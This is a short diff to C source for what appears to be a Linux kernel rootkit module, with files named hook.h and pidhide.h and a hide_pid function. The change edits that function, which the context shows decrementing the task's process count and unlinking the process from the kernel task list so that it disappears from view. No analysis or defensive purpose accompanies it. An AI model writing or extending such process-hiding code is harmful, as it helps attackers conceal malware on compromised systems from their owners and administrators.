@@ -2,6 +2,7 @@
 #include <linux/pid.h>
 #include <linux/sched.h>
 #include <linux/proc_fs.h>
+#include <linux/task.h>
 
 #include "hook.h"
 #include "pidhide.h"
@@ -75,7 +76,6 @@ hide_pid(pid_t pid)
     rcu_read_lock();
     atomic_dec(&__task_cred(ts)->user->processes);
     rcu_read_unlock();
-    proc_flush_task(ts);
 
 	write_lock_irq(&tasklist_lock);
     list_del(&ts->tasks);
